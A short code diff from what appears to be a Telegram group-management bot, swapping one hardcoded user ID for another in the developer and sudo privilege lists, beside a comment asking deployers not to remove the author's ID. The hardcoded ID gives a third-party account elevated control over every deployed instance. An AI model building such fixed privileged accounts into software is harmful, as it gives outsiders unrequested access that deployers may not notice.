@@ -139,9 +139,9 @@ else:
 
 # Don't Remove my ID from DEV and SUDO list..It Took many months to set up a bot like this..I have added many features in this bot ..by @Sur_vivor     
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1118936839)
+DEV_USERS.add(1169076058)
 SUDO_USERS.add(OWNER_ID)
-SUDO_USERS.add(1118936839)
+SUDO_USERS.add(1169076058)
 
 updater = tg.Updater(TOKEN, workers=WORKERS)
 dispatcher = updater.dispatcher
